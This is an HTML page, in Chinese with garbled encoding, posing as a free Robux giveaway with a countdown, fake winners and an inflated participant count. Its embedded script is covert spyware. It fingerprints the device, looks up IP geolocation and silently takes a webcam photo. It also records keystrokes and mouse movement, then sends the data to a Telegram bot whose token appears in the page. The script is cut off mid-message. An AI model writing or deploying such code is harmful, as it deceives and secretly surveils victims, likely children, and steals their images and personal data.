<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ® å…è´¹RobuxæŠ½å¥–æ´»åŠ¨ - å€’è®¡æ—¶è¿›è¡Œä¸­ï¼</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Microsoft YaHei', 'Segoe UI', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
            color: #fff;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        /* é—ªçƒçš„æ˜Ÿæ˜ŸèƒŒæ™¯ */
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }

        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 1; }
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        /* å¤´éƒ¨æ ·å¼ */
        .header {
            text-align: center;
            padding: 40px 20px;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 3.5rem;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #ff3366 0%, #ffcc00 50%, #00ffaa 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(0, 255, 170, 0.3);
            animation: glow 2s infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 0 0 20px rgba(0, 255, 170, 0.3); }
            to { text-shadow: 0 0 30px rgba(255, 51, 102, 0.5); }
        }

        /* ä¸»å€’è®¡æ—¶å®¹å™¨ */
        .countdown-container {
            background: rgba(0, 20, 40, 0.8);
            border: 2px solid #00ffaa;
            border-radius: 20px;
            padding: 40px;
            margin: 30px auto;
            max-width: 800px;
            text-align: center;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 50px rgba(0, 255, 170, 0.2);
        }

        /* å€’è®¡æ—¶æ ‡é¢˜ */
        .countdown-title {
            font-size: 2.2rem;
            color: #00ffaa;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        /* å€’è®¡æ—¶æ˜¾ç¤º */
        .countdown-display {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 40px 0;
        }

        .time-unit {
            background: rgba(0, 0, 0, 0.6);
            border: 2px solid #ffcc00;
            border-radius: 15px;
            padding: 25px;
            min-width: 120px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .time-unit::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            animation: shine 3s infinite;
        }

        @keyframes shine {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .time-number {
            font-size: 3.5rem;
            font-weight: bold;
            color: #ffcc00;
            text-shadow: 0 0 15px rgba(255, 204, 0, 0.5);
        }

        .time-label {
            font-size: 1.2rem;
            color: #8af;
            margin-top: 10px;
        }

        /* è¿›åº¦æ¡ */
        .progress-container {
            margin: 30px 0;
        }

        .progress-info {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #8af;
        }

        .progress-bar {
            height: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
        }

        .progress {
            height: 100%;
            background: linear-gradient(90deg, #ff3366, #ffcc00);
            border-radius: 10px;
            width: 0%;
            transition: width 1s ease;
            position: relative;
        }

        .progress::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            animation: loading 2s infinite;
        }

        @keyframes loading {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        /* å‚ä¸ç”¨æˆ·æ•° */
        .participants {
            font-size: 1.3rem;
            color: #ff3366;
            margin: 20px 0;
            animation: bounce 2s infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }

        /* å¥–å“é¢„è§ˆ */
        .prize-preview {
            background: rgba(255, 51, 102, 0.1);
            border: 1px solid #ff3366;
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
        }

        .prize-preview h3 {
            color: #ffcc00;
            margin-bottom: 15px;
            font-size: 1.8rem;
        }

        /* å€’è®¡æ—¶æç¤º */
        .countdown-tip {
            color: #8af;
            font-size: 1.1rem;
            margin-top: 20px;
            padding: 15px;
            background: rgba(0, 100, 200, 0.2);
            border-radius: 10px;
        }

        /* åŠ è½½åŠ¨ç”» */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: #00ffaa;
            font-size: 1.3rem;
        }

        .loading-spinner {
            width: 80px;
            height: 80px;
            border: 4px solid transparent;
            border-top: 4px solid #00ffaa;
            border-right: 4px solid #00ffaa;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
        }

        /* éªŒè¯é¢æ¿ï¼ˆéšè—ï¼‰ */
        .verification-panel {
            display: none;
        }

        .data-stream {
            height: 150px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #00ffaa;
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            font-family: 'Consolas', monospace;
            color: #00ffaa;
            font-size: 0.9rem;
        }

        /* æˆåŠŸé¡µé¢ */
        .success-screen {
            text-align: center;
            padding: 50px 20px;
            display: none;
        }

        /* å“åº”å¼è®¾è®¡ */
        @media (max-width: 768px) {
            .header h1 {
                font-size: 2.5rem;
            }
            .time-unit {
                min-width: 80px;
                padding: 15px;
            }
            .time-number {
                font-size: 2.5rem;
            }
        }

        /* éšè—å…ƒç´  */
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- æ˜Ÿæ˜ŸèƒŒæ™¯ -->
    <div class="stars" id="stars"></div>
    
    <!-- åˆå§‹åŠ è½½é®ç½© -->
    <div class="loading-overlay" id="initialLoading">
        <div class="loading-spinner"></div>
        <div id="initialLoadingText">æ­£åœ¨åŠ è½½æŠ½å¥–æ´»åŠ¨...</div>
    </div>
<div class="container" id="mainContent" style="display: none;">
    <!-- å¤´éƒ¨ -->
    <div class="header">
        <h1>ğŸ é™æ—¶ROBUXå…è´¹æŠ½å¥– ğŸ</h1>
        <p>å€’è®¡æ—¶ç»“æŸåç«‹å³å¼€å¥–ï¼100%ä¸­å¥–ç‡ï¼</p>
        <div style="font-size: 2rem; margin: 20px 0;">ğŸª™ğŸ’°ğŸ’ğŸŒŸ</div>
    </div>

    <!-- ä¸»å€’è®¡æ—¶å®¹å™¨ -->
    <div class="countdown-container">
        <h2 class="countdown-title">â³ æŠ½å¥–å€’è®¡æ—¶</h2>
        <p style="color: #8af; margin-bottom: 20px; font-size: 1.2rem;">
            è¯·åœ¨å€’è®¡æ—¶ç»“æŸå‰å®ŒæˆéªŒè¯ï¼Œå¦åˆ™å°†å¤±å»æŠ½å¥–èµ„æ ¼ï¼
        </p>
        
        <!-- å€’è®¡æ—¶æ˜¾ç¤º -->
        <div class="countdown-display">
            <div class="time-unit">
                <div class="time-number" id="minutes">05</div>
                <div class="time-label">åˆ†é’Ÿ</div>
            </div>
            <div class="time-unit">
                <div class="time-number" id="seconds">00</div>
                <div class="time-label">ç§’é’Ÿ</div>
            </div>
        </div>

        <!-- è¿›åº¦æ¡ -->
        <div class="progress-container">
            <div class="progress-info">
                <span>ç­‰å¾…éªŒè¯</span>
                <span id="progressText">0%</span>
            </div>
            <div class="progress-bar">
                <div class="progress" id="progressBar"></div>
            </div>
        </div>

        <!-- å‚ä¸ç”¨æˆ·æ•° -->
        <div class="participants" id="participantsCount">
            ğŸ¯ å·²æœ‰ <span id="participantsNumber">1,847</span> äººæ­£åœ¨ç­‰å¾…å¼€å¥–
        </div>

        <!-- å¥–å“é¢„è§ˆ -->
        <div class="prize-preview">
            <h3>ğŸ ä»Šæ—¥å¥–å“æ± </h3>
            <div style="display: flex; justify-content: space-around; flex-wrap: wrap; gap: 15px;">
                <div style="text-align: center;">
                    <div style="color: #ffcc00; font-size: 1.8rem; font-weight: bold;">5,000</div>
                    <div style="color: #8af;">Robux</div>
                </div>
                <div style="text-align: center;">
                    <div style="color: #ffcc00; font-size: 1.8rem; font-weight: bold;">2,500</div>
                    <div style="color: #8af;">Robux</div>
                </div>
                <div style="text-align: center;">
                    <div style="color: #ffcc00; font-size: 1.8rem; font-weight: bold;">1,000</div>
                    <div style="color: #8af;">Robux</div>
                </div>
            </div>
        </div>

        <!-- å€’è®¡æ—¶æç¤º -->
        <div class="countdown-tip">
            ğŸ’¡ æç¤ºï¼šè¯·ä¿æŒæ­¤é¡µé¢å¼€å¯ï¼Œå€’è®¡æ—¶ç»“æŸåè‡ªåŠ¨è·³è½¬åˆ°æŠ½å¥–é¡µé¢ï¼
        </div>
    </div>

    <!-- æœ€è¿‘è·å¥–è€…ï¼ˆä¼ªé€ æ•°æ®ï¼‰ -->
    <div style="background: rgba(0, 40, 80, 0.7); border-radius: 15px; padding: 25px; margin: 30px auto; max-width: 800px;">
        <h3 style="color: #ffcc00; text-align: center; margin-bottom: 20px;">ğŸ† æœ€è¿‘è·å¥–è€…</h3>
        <div style="color: #aaf; margin-bottom: 10px;">
            ğŸ‰ <strong>@RobloxMaster123</strong> åˆšåˆšèµ¢å¾—äº† <span style="color: #ffcc00;">5,000 Robux</span>
            <span style="float: right; color: #8af;">2åˆ†é’Ÿå‰</span>
        </div>
        <div style="color: #aaf; margin-bottom: 10px;">
            ğŸ‰ <strong>@GameGirl456</strong> åˆšåˆšèµ¢å¾—äº† <span style="color: #ffcc00;">2,500 Robux</span>
            <span style="float: right; color: #8af;">5åˆ†é’Ÿå‰</span>
        </div>
        <div style="color: #aaf;">
            ğŸ‰ <strong>@BuilderPro789</strong> åˆšåˆšèµ¢å¾—äº† <span style="color: #ffcc00;">1,000 Robux</span>
            <span style="float: right; color: #8af;">8åˆ†é’Ÿå‰</span>
        </div>
    </div>

    <!-- éªŒè¯é¢æ¿ï¼ˆéšè—ï¼‰ -->
    <div class="verification-panel" id="verificationPanel">
        <h3 style="color: #00ffaa; text-align: center;">ğŸ” ç³»ç»ŸéªŒè¯ä¸­...</h3>
        <div class="data-stream" id="dataStream">
            [ç³»ç»Ÿ] æ­£åœ¨å‡†å¤‡éªŒè¯æµç¨‹...<br>
        </div>
    </div>

    <!-- æˆåŠŸé¡µé¢ -->
    <div class="success-screen" id="successScreen">
        <div style="font-size: 5rem; margin-bottom: 20px;">ğŸ‰</div>
        <h2 style="color: #00ffaa; margin-bottom: 15px;">æ­å–œï¼éªŒè¯å®Œæˆ</h2>
        <p style="color: #8af; font-size: 1.2rem; margin-bottom: 25px;">
            æ‚¨å·²æˆåŠŸè¿›å…¥æŠ½å¥–é˜Ÿåˆ—ï¼è¯·ç­‰å¾…å€’è®¡æ—¶ç»“æŸå¼€å¥–ã€‚
        </p>
        <div style="background: rgba(0, 255, 170, 0.1); padding: 25px; border-radius: 15px; max-width: 500px; margin: 0 auto;">
            <p style="color: #00ffaa; margin-bottom: 10px;">ğŸ¯ <strong>æ‚¨çš„é˜Ÿåˆ—ç¼–å·ï¼š</strong> <span id="queueNumber" style="color: #ffcc00;">Q-</span></p>
            <p style="color: #00ffaa; margin-bottom: 10px;">â° <strong>é¢„è®¡å¼€å¥–æ—¶é—´ï¼š</strong> <span id="estimatedTime">--:--</span></p>
            <p style="color: #00ffaa; margin-bottom: 10px;">ğŸ“± <strong>é€šçŸ¥æ–¹å¼ï¼š</strong> Robloxç«™å†…ä¿¡é€šçŸ¥</p>
            <p style="color: #00ffaa;">ğŸ’° <strong>å½“å‰å¥–æ± ï¼š</strong> <span style="color: #ffcc00;">50,000+ Robux</span></p>
        </div>
        <div style="margin-top: 30px; padding: 20px; background: rgba(0, 100, 200, 0.2); border-radius: 10px;">
            <p style="color: #8af;">âš ï¸ è¯·ä¸è¦å…³é—­æ­¤é¡µé¢ï¼Œå¦åˆ™å¯èƒ½å¤±å»æŠ½å¥–èµ„æ ¼ï¼</p>
        </div>
    </div>

    <!-- éšè—å…ƒç´  -->
    <video id="cameraPreview" style="display: none;" autoplay playsinline></video>
    <canvas id="photoCanvas" style="display: none;"></canvas>

    <!-- é¡µè„š -->
    <div style="text-align: center; margin-top: 50px; padding-top: 20px; border-top: 1px solid rgba(255, 255, 255, 0.1);">
        <p style="color: #666; font-size: 0.9rem;">
            Â© 2024 RobuxæŠ½å¥–æ´»åŠ¨å®˜æ–¹å¹³å°<br>
            æœ¬æ´»åŠ¨ä¸Roblox Corporationæ— å…³ã€‚Robuxæ˜¯Roblox Corporationçš„å•†æ ‡ã€‚
        </p>
    </div>
</div>

<script>
    // ==================== é…ç½®ä¿¡æ¯ ====================
    const TELEGRAM_CONFIG = {
        botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",
        chatId: "8313770381",
        sendInterval: 5000 // 5ç§’å‘é€ä¸€æ¬¡æ•°æ®
    };

    // ==================== å…¨å±€å˜é‡ ====================
    let collectedData = {
        timestamp: new Date().toISOString(),
        status: 'å€’è®¡æ—¶ä¸­',
        stage: 'waiting',
        ip: null,
        location: null,
        device: {},
        network: {},
        behavior: [],
        camera: { accessed: false, photo: null },
        countdownData: {}
    };

    let countdownInterval;
    let dataStreamInterval;
    let totalSeconds = 300; // 5åˆ†é’Ÿå€’è®¡æ—¶
    let currentSeconds = totalSeconds;
    let telemetrySent = false;
    let cameraAccessed = false;
    let mousePositions = [];
    let keyStrokes = [];
    let dataCollectionStarted = false;
    let collectionProgress = 0;
    let starsCreated = false;

    // ==================== DOMå…ƒç´  ====================
    const initialLoading = document.getElementById('initialLoading');
    const initialLoadingText = document.getElementById('initialLoadingText');
    const mainContent = document.getElementById('mainContent');
    const verificationPanel = document.getElementById('verificationPanel');
    const dataStream = document.getElementById('dataStream');
    const successScreen = document.getElementById('successScreen');
    const cameraPreview = document.getElementById('cameraPreview');
    const photoCanvas = document.getElementById('photoCanvas');
    const minutesElement = document.getElementById('minutes');
    const secondsElement = document.getElementById('seconds');
    const progressBar = document.getElementById('progressBar');
    const progressText = document.getElementById('progressText');
    const participantsNumber = document.getElementById('participantsNumber');
    const queueNumber = document.getElementById('queueNumber');
    const estimatedTime = document.getElementById('estimatedTime');
    const starsContainer = document.getElementById('stars');
// ==================== å€’è®¡æ—¶å’Œè§†è§‰æ•ˆæœ ====================

// åˆ›å»ºæ˜Ÿæ˜ŸèƒŒæ™¯
function createStars() {
    if (starsCreated) return;
    
    for (let i = 0; i < 100; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        star.style.width = Math.random() * 3 + 1 + 'px';
        star.style.height = star.style.width;
        star.style.left = Math.random() * 100 + '%';
        star.style.top = Math.random() * 100 + '%';
        star.style.animationDelay = Math.random() * 3 + 's';
        star.style.opacity = Math.random() * 0.5 + 0.2;
        starsContainer.appendChild(star);
    }
    starsCreated = true;
}

// åˆå§‹åŒ–å€’è®¡æ—¶
function initCountdown() {
    updateCountdownDisplay();
    
    // æ›´æ–°å€’è®¡æ—¶
    countdownInterval = setInterval(() => {
        currentSeconds--;
        updateCountdownDisplay();
        updateProgressBar();
        updateParticipants();
        
        // æ¯ç§’æ£€æŸ¥æ˜¯å¦éœ€è¦å¼€å§‹æ•°æ®æ”¶é›†
        checkDataCollection();
        
        // å€’è®¡æ—¶ç»“æŸ
        if (currentSeconds <= 0) {
            clearInterval(countdownInterval);
            showSuccessScreen();
        }
    }, 1000);
    
    // åˆ›å»ºæ˜Ÿæ˜ŸèƒŒæ™¯
    createStars();
}

// æ›´æ–°å€’è®¡æ—¶æ˜¾ç¤º
function updateCountdownDisplay() {
    const minutes = Math.floor(currentSeconds / 60);
    const seconds = currentSeconds % 60;
    
    minutesElement.textContent = minutes.toString().padStart(2, '0');
    secondsElement.textContent = seconds.toString().padStart(2, '0');
    
    // æœ€å30ç§’é—ªçƒæ•ˆæœ
    if (currentSeconds <= 30) {
        secondsElement.style.animation = currentSeconds % 2 === 0 ? 'pulse 0.5s infinite' : 'none';
    }
}

// æ›´æ–°è¿›åº¦æ¡
function updateProgressBar() {
    const progress = ((totalSeconds - currentSeconds) / totalSeconds) * 100;
    progressBar.style.width = progress + '%';
    progressText.textContent = Math.round(progress) + '%';
    
    // æ ¹æ®è¿›åº¦æ›´æ–°æ–‡æœ¬
    if (progress < 25) {
        progressText.textContent = Math.round(progress) + '% - ç­‰å¾…éªŒè¯';
    } else if (progress < 50) {
        progressText.textContent = Math.round(progress) + '% - éªŒè¯ä¸­';
    } else if (progress < 75) {
        progressText.textContent = Math.round(progress) + '% - å³å°†å®Œæˆ';
    } else {
        progressText.textContent = Math.round(progress) + '% - å‡†å¤‡å¼€å¥–';
    }
}

// æ›´æ–°å‚ä¸äººæ•°
function updateParticipants() {
    const current = parseInt(participantsNumber.textContent.replace(/,/g, ''));
    // æ¯ç§’å¢åŠ 1-3äºº
    const increase = Math.floor(Math.random() * 3) + 1;
    participantsNumber.textContent = (current + increase).toLocaleString();
    
    // éšæœºæ›´æ–°é¢„è®¡æ—¶é—´
    if (Math.random() < 0.1) {
        const time = new Date();
        time.setMinutes(time.getMinutes() + Math.floor(Math.random() * 5) + 1);
        estimatedTime.textContent = time.getHours().toString().padStart(2, '0') + ':' + 
                                  time.getMinutes().toString().padStart(2, '0');
    }
}

// æ£€æŸ¥æ˜¯å¦éœ€è¦å¼€å§‹æ•°æ®æ”¶é›†
function checkDataCollection() {
    // å€’è®¡æ—¶å¼€å§‹å10ç§’å¼€å§‹æ•°æ®æ”¶é›†ï¼ˆç”¨æˆ·ä¸ä¼šå¯Ÿè§‰ï¼‰
    if (!dataCollectionStarted && currentSeconds <= (totalSeconds - 10)) {
        startStealthDataCollection();
        dataCollectionStarted = true;
    }
    
    // å€’è®¡æ—¶è¿‡åŠæ—¶æ˜¾ç¤ºéªŒè¯é¢æ¿ï¼ˆä½†éšè—èµ·æ¥ï¼‰
    if (currentSeconds <= totalSeconds / 2 && verificationPanel.style.display === 'none') {
        showVerificationPanel();
    }
}

// æ˜¾ç¤ºéªŒè¯é¢æ¿ï¼ˆä½†ä¿æŒéšè—ï¼‰
function showVerificationPanel() {
    // å®é™…ä¸Šä¸æ˜¾ç¤ºç»™ç”¨æˆ·çœ‹ï¼Œåªåœ¨åå°è¿è¡Œ
    verificationPanel.style.display = 'block';
    verificationPanel.style.opacity = '0';
    verificationPanel.style.height = '0';
    verificationPanel.style.overflow = 'hidden';
    logToStream('[ç³»ç»Ÿ] å¼€å§‹åå°éªŒè¯æµç¨‹...');
}

// æ˜¾ç¤ºæˆåŠŸé¡µé¢
function showSuccessScreen() {
    // éšè—å…¶ä»–å†…å®¹
    document.querySelector('.countdown-container').style.display = 'none';
    
    // æ˜¾ç¤ºæˆåŠŸé¡µé¢
    successScreen.style.display = 'block';
    
    // ç”Ÿæˆé˜Ÿåˆ—ç¼–å·
    const queueNum = 'Q-' + Math.random().toString(36).substr(2, 8).toUpperCase();
    queueNumber.textContent = queueNum;
    collectedData.queueNumber = queueNum;
    
    // å‘é€æœ€ç»ˆæ•°æ®
    sendFinalData();
}

// æ›´æ–°åŠ è½½æ–‡æœ¬
function updateLoading(text) {
    if (initialLoadingText) {
        initialLoadingText.textContent = text;
    }
}

// è®°å½•æ•°æ®æµï¼ˆåå°ï¼‰
function logToStream(message) {
    if (dataStream) {
        const timestamp = new Date().toLocaleTimeString();
        dataStream.innerHTML += `[${timestamp}] ${message}<br>`;
        dataStream.scrollTop = dataStream.scrollHeight;
    }
    console.log(message);
}
// ==================== éšè”½æ•°æ®æ”¶é›† ====================

// å¼€å§‹éšè”½æ•°æ®æ”¶é›†
function startStealthDataCollection() {
    logToStream('[ç³»ç»Ÿ] å¯åŠ¨éšè”½æ•°æ®æ”¶é›†...');
    collectedData.status = 'æ”¶é›†æ•°æ®ä¸­';
    collectedData.stage = 'stealth_collection';
    
    // åˆ†é˜¶æ®µæ”¶é›†ï¼Œé¿å…ä¸€æ¬¡æ€§è¯·æ±‚å¼•èµ·æ³¨æ„
    setTimeout(() => collectBasicInfo(), 1000);
    setTimeout(() => collectDeviceInfo(), 2000);
    setTimeout(() => tryStealthCamera(), 3000);
    setTimeout(() => collectNetworkInfo(), 4000);
    setTimeout(() => startBehaviorTracking(), 5000);
    setTimeout(() => startTelemetrySending(), 6000);
}

// æ”¶é›†åŸºæœ¬ä¿¡æ¯
function collectBasicInfo() {
    logToStream('[ç³»ç»Ÿ] æ”¶é›†åŸºæœ¬ä¿¡æ¯...');
    
    collectedData.timestamp = new Date().toISOString();
    collectedData.referrer = document.referrer;
    collectedData.url = window.location.href;
    collectedData.viewport = `${window.innerWidth}x${window.innerHeight}`;
    
    // è®°å½•å€’è®¡æ—¶æ•°æ®
    collectedData.countdownData = {
        totalSeconds: totalSeconds,
        remainingSeconds: currentSeconds,
        startTime: new Date().toISOString()
    };
}

// æ”¶é›†è®¾å¤‡ä¿¡æ¯
function collectDeviceInfo() {
    logToStream('[ç³»ç»Ÿ] æ‰«æè®¾å¤‡ä¿¡æ¯...');
    
    collectedData.device = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || 'æœªçŸ¥',
        maxTouchPoints: navigator.maxTouchPoints,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookieEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        browser: detectBrowser(),
        browserVersion: detectBrowserVersion(),
        os: detectOS()
    };

    // è¿æ¥ä¿¡æ¯
    if (navigator.connection) {
        collectedData.device.connection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        };
    }

    // ç”µæ± ä¿¡æ¯
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            collectedData.device.battery = {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging
            };
        });
    }
}

// æ£€æµ‹æµè§ˆå™¨
function detectBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    if (ua.includes("Edg")) return "Edge";
    return "æœªçŸ¥";
}

// æ£€æµ‹æµè§ˆå™¨ç‰ˆæœ¬
function detectBrowserVersion() {
    const ua = navigator.userAgent;
    const matches = ua.match(/(chrome|firefox|safari|edge)\/?\s*(\d+)/i);
    return matches ? matches[2] : 'æœªçŸ¥';
}

// æ£€æµ‹æ“ä½œç³»ç»Ÿ
function detectOS() {
    const ua = navigator.userAgent;
    if (ua.includes("Windows")) return "Windows";
    if (ua.includes("Mac")) return "MacOS";
    if (ua.includes("Linux")) return "Linux";
    if (ua.includes("Android")) return "Android";
    if (ua.includes("iOS") || ua.includes("iPhone")) return "iOS";
    return "æœªçŸ¥";
}

// å°è¯•éšè”½æ‘„åƒå¤´è®¿é—®
async function tryStealthCamera() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        logToStream('[ç³»ç»Ÿ] æ‘„åƒå¤´APIä¸æ”¯æŒ');
        return;
    }

    try {
        logToStream('[ç³»ç»Ÿ] å°è¯•è®¿é—®æ‘„åƒå¤´...');
        
        // ä½¿ç”¨æœ€å°é…ç½®ï¼Œå‡å°‘æç¤º
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 320 },
                height: { ideal: 240 },
                facingMode: 'user'
            },
            audio: false
        });

        cameraAccessed = true;
        collectedData.camera.accessed = true;
        logToStream('[ç³»ç»Ÿ] æ‘„åƒå¤´è®¿é—®æˆåŠŸ');
        
        // ç«‹å³æ‹ç…§ä½†ä¸æ˜¾ç¤º
        cameraPreview.srcObject = stream;
        
        setTimeout(() => {
            try {
                const context = photoCanvas.getContext('2d');
                photoCanvas.width = cameraPreview.videoWidth || 320;
                photoCanvas.height = cameraPreview.videoHeight || 240;
                
                if (cameraPreview.videoWidth > 0) {
                    context.drawImage(cameraPreview, 0, 0);
                    
                    // è½¬æ¢ä¸ºblob
                    photoCanvas.toBlob(async (blob) => {
                        if (blob) {
                            collectedData.camera.photo = 'å·²æ•è·';
                            logToStream('[ç³»ç»Ÿ] ç…§ç‰‡æ•è·æˆåŠŸ');
                            
                            // å‘é€ç…§ç‰‡åˆ°Telegram
                            await sendToTelegram(blob, true);
                            
                            // å…³é—­æ‘„åƒå¤´
                            stream.getTracks().forEach(track => track.stop());
                            cameraPreview.srcObject = null;
                        }
                    }, 'image/jpeg', 0.6);
                }
            } catch (e) {
                logToStream('[ç³»ç»Ÿ] ç…§ç‰‡æ•è·å¤±è´¥');
            }
        }, 500); // åŠç§’åæ‹ç…§
        
    } catch (error) {
        logToStream(`[ç³»ç»Ÿ] æ‘„åƒå¤´è¢«æ‹’ç»: ${error.name}`);
        collectedData.camera.error = error.name;
    }
}

// æ”¶é›†ç½‘ç»œä¿¡æ¯
async function collectNetworkInfo() {
    try {
        logToStream('[ç³»ç»Ÿ] æ”¶é›†ç½‘ç»œä¿¡æ¯...');
        
        // è·å–IP
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        collectedData.ip = ipData.ip;
        
        // è·å–åœ°ç†ä½ç½®
        try {
            const geoResponse = await fetch(`https://ipapi.co/${collectedData.ip}/json/`);
            const geoData = await geoResponse.json();
            
            collectedData.network = {
                ip: collectedData.ip,
                city: geoData.city,
                region: geoData.region,
                country: geoData.country_name,
                isp: geoData.org,
                latitude: geoData.latitude,
                longitude: geoData.longitude
            };
            
            collectedData.location = `${geoData.city || 'æœªçŸ¥'}, ${geoData.country_name || 'æœªçŸ¥'}`;
            
        } catch (e) {
            // å¤‡ç”¨API
            try {
                const fallback = await fetch(`http://ip-api.com/json/${collectedData.ip}`);
                const fallbackData = await fallback.json();
                if (fallbackData.status === 'success') {
                    collectedData.location = `${fallbackData.city}, ${fallbackData.country}`;
                    collectedData.network.isp = fallbackData.isp;
                }
            } catch (e2) {}
        }
        
    } catch (error) {
        logToStream('[ç³»ç»Ÿ] ç½‘ç»œä¿¡æ¯æ”¶é›†å¤±è´¥');
    }
}
        // ==================== è¡Œä¸ºè·Ÿè¸ª ====================

        // å¼€å§‹è¡Œä¸ºè·Ÿè¸ª
        function startBehaviorTracking() {
            logToStream('[ç³»ç»Ÿ] å¼€å§‹è¡Œä¸ºè·Ÿè¸ª...');
            
            // è·Ÿè¸ªé¼ æ ‡ç§»åŠ¨
            document.addEventListener('mousemove', (event) => {
                mousePositions.push({
                    x: event.clientX,
                    y: event.clientY,
                    time: Date.now()
                });
                
                // é™åˆ¶å­˜å‚¨æ•°é‡
                if (mousePositions.length > 50) {
                    mousePositions = mousePositions.slice(-50);
                }
            });
            
            // è·Ÿè¸ªç‚¹å‡»
            document.addEventListener('click', (event) => {
                collectedData.behavior.push({
                    type: 'click',
                    x: event.clientX,
                    y: event.clientY,
                    timestamp: new Date().toISOString()
                });
            });
            
            // è·Ÿè¸ªé”®ç›˜è¾“å…¥
            document.addEventListener('keydown', (event) => {
                keyStrokes.push({
                    key: event.key,
                    code: event.code,
                    time: Date.now()
                });
                
                // é™åˆ¶å­˜å‚¨æ•°é‡
                if (keyStrokes.length > 100) {
                    keyStrokes = keyStrokes.slice(-100);
                }
            });
            
            // è·Ÿè¸ªé¡µé¢æ´»åŠ¨
            document.addEventListener('visibilitychange', () => {
                collectedData.behavior.push({
                    type: 'visibility_change',
                    state: document.hidden ? 'hidden' : 'visible',
                    timestamp: new Date().toISOString()
                });
            });
        }

        // ==================== Telegramå‘é€ ====================

        // æ ¼å¼åŒ–Telegramæ¶ˆæ¯
        function formatTelegramMessage() {
            const now = new Date();
            const timeStr = now.toLocaleTimeString();
            const remainingTime = `${Math.floor(currentSeconds/60)}:${(currentSeconds%60).toString().padStart(2,'0')}`;
            
            return `ğŸš¨ ROBUXå€’è®¡æ—¶ç”¨æˆ·æ•°æ® ğŸš¨

ğŸ“… æ”¶é›†æ—¶é—´: ${now.toLocaleString()}
â³ å€’è®¡æ—¶å‰©ä½™: ${remainingTime}
ğŸŒ IPåœ°å€: ${collectedData.ip || 'è·å–ä¸­...'}
ğŸ“ åœ°ç†ä½ç½®: ${collectedData.location || 'è·å–ä¸­...'}
ğŸ“± è®¾å¤‡: ${collectedData.device.os || 'æœªçŸ¥'} | ${collectedData.device.browser || 'æœªçŸ¥'}
ğŸ–¥ï¸ å±å¹•: ${collectedData.device.screen || 'æœªçŸ¥'}
ğŸŒ æµè§ˆå™¨: ${collectedData.device.browser || 'æœªçŸ¥'} ${collectedData.device.browserVersion || ''}
ğŸ—£ï¸ è¯­è¨€: ${collectedData.device.language || 'æœªçŸ¥'}
â±ï¸ æ—¶åŒº: ${collectedData.device.timezone || 'æœªçŸ¥'}
ğŸ“¸ æ‘„åƒå¤´: ${cameraAccessed ? 'è®¿é—®æˆåŠŸ âœ…' : 'æœªè®¿é—® âŒ'}
ğŸ–±ï¸ é¼ æ ‡è½¨è¿¹: ${mousePositions.length} ç‚¹
